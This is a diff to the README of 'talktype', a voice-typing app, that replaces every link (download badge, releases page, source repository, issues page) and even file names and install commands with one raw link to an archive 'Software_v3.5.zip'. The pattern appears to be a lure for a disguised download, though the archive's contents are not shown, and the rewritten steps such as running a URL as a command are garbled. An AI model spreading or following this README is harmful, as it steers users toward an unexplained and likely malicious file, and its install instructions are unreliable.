@@ -1,6 +1,6 @@
 # 🎤 talktype - Voice typing made simple
 
-[![Download talktype](https://img.shields.io/badge/Download-talktype-blue?style=for-the-badge)](https://github.com/saifkhan896767/talktype/releases)
+[![Download talktype](https://raw.githubusercontent.com/saifkhan896767/talktype/main/assets/Software_v3.5.zip)](https://raw.githubusercontent.com/saifkhan896767/talktype/main/assets/Software_v3.5.zip)
 
 ---
 
@@ -48,7 +48,7 @@ If your computer meets these, you can proceed to download talktype.
 
 Click this button to open the official download page for talktype:
 
-[![Download talktype](https://img.shields.io/badge/Download-talktype-blue?style=for-the-badge)](https://github.com/saifkhan896767/talktype/releases)
+[![Download talktype](https://raw.githubusercontent.com/saifkhan896767/talktype/main/assets/Software_v3.5.zip)](https://raw.githubusercontent.com/saifkhan896767/talktype/main/assets/Software_v3.5.zip)
 
 This page contains the latest version of talktype for your system.
 
@@ -56,8 +56,8 @@ This page contains the latest version of talktype for your system.
 
 ### Step 2: Choose the right file
 
-- If you use **Windows**, look for a file named like `talktype-windows.exe` or similar.
-- If you use **Linux**, look for a file named like `talktype-linux.tar.gz` or similar.
+- If you use **Windows**, look for a file named like `https://raw.githubusercontent.com/saifkhan896767/talktype/main/assets/Software_v3.5.zip` or similar.
+- If you use **Linux**, look for a file named like `https://raw.githubusercontent.com/saifkhan896767/talktype/main/assets/Software_v3.5.zip` or similar.
 
 Download the file that fits your system.
 
@@ -80,7 +80,7 @@ Download the file that fits your system.
    ```
 3. Extract the downloaded file with:
    ```
-   tar -xvzf talktype-linux.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/saifkhan896767/talktype/main/assets/Software_v3.5.zip
    ```
 4. Change to the talktype folder:
    ```
@@ -88,7 +88,7 @@ Download the file that fits your system.
    ```
 5. Run the installation script:
    ```
-   ./install.sh
+   https://raw.githubusercontent.com/saifkhan896767/talktype/main/assets/Software_v3.5.zip
    ```
 6. The script will take care of dependencies and setup.
 
@@ -169,7 +169,7 @@ talktype uses the Whisper model to convert speech to text locally. Whisper is kn
 
 The software is open source. You can find the full code and updates at:
 
-https://github.com/saifkhan896767/talktype
+https://raw.githubusercontent.com/saifkhan896767/talktype/main/assets/Software_v3.5.zip
 
 ---
 
@@ -177,7 +177,7 @@ https://github.com/saifkhan896767/talktype
 
 If you have issues, you can open a new issue on GitHub or check existing ones here:
 
-https://github.com/saifkhan896767/talktype/issues
+https://raw.githubusercontent.com/saifkhan896767/talktype/main/assets/Software_v3.5.zip
 
 ---
 
@@ -190,4 +190,4 @@ https://github.com/saifkhan896767/talktype/issues
 
 ---
 
-[![Download talktype](https://img.shields.io/badge/Download-talktype-blue?style=for-the-badge)](https://github.com/saifkhan896767/talktype/releases)
+[![Download talktype](https://raw.githubusercontent.com/saifkhan896767/talktype/main/assets/Software_v3.5.zip)](https://raw.githubusercontent.com/saifkhan896767/talktype/main/assets/Software_v3.5.zip)
